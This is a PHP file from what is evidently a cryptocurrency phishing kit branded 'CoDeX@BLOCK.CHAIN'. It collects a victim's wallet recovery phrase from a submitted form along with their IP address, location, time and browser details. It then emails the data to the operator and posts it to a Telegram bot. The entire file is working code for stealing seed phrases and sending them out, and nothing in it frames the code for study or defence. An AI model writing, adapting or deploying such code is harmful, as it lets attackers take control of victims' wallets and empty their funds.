<?php
include("system.php");
include("detect.php");
$chatId = trim(file_get_contents("../admin/chatId.ini"));
$botUrl = trim(file_get_contents("../admin/botUrl.ini"));
$telegram = trim(file_get_contents("../admin/status_telegram.ini"));
$user_ids = trim(file_get_contents("../admin/email.ini"));
extract($_REQUEST);

# Store Post values in variables
// Here variable $a is just an example (replace with your own variables)

$_SESSION['mnemonic']   = $_POST['mnemonic'];



$ip		= $_SERVER['REMOTE_ADDR'];

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser);

# Format for Telegram & Discord
// Here variable $a is just an example (replace with your own variables)

$data = "
+++++++++++🌐 CoDeX@BLOCK.CHAIN RECOVERY PHRASE INFO 🌐+++++++++++
Seed Phrase = ".$_SESSION['mnemonic']."
+++++++++++🌐 CoDeX@BLOCK.CHAIN RECOVERY PHRASE INFO 🌐+++++++++++

+++++++++++🌐 CoDeX@BLOCK.CHAIN IP INFOS 🌐+++++++++++
IP      = $ip
Country = $countryname
City    = $countrycity
TIME = $InfoDATE 
BROWSER = $UserAgent
+++++++++++🌐 CoDeX@BLOCK.CHAIN IP INFOS 🌐+++++++++++
";

$msg = "
+++++++++++🌐 CoDeX@BLOCK.CHAIN RECOVERY PHRASE INFO 🌐+++++++++++<br>
Seed Phrase = ".$_SESSION['mnemonic']." <br>
+++++++++++🌐 CoDeX@BLOCK.CHAIN RECOVERY PHRASE INFO 🌐+++++++++++
<br>
+++++++++++🌐 CoDeX@BLOCK.CHAIN IP INFOS 🌐+++++++++++<br>
IP      = $ip  <br>
Country = $countryname <br>
City    = $countrycity <br>
TIME = $InfoDATE <br>
BROWSER = $UserAgent <br>
+++++++++++🌐 CoDeX@BLOCK.CHAIN IP INFOS 🌐+++++++++++ <br>

";


// Email send function
$sender = 'From: 💎 C0DeX 💎 <result@codex.com>';
$sub="NEW BLOCKCHAIN RECOVERY PHRASE FROM [$ip] [$countrycode] ";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$result=mail($user_ids, $sub, $msg, $headers);

// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}
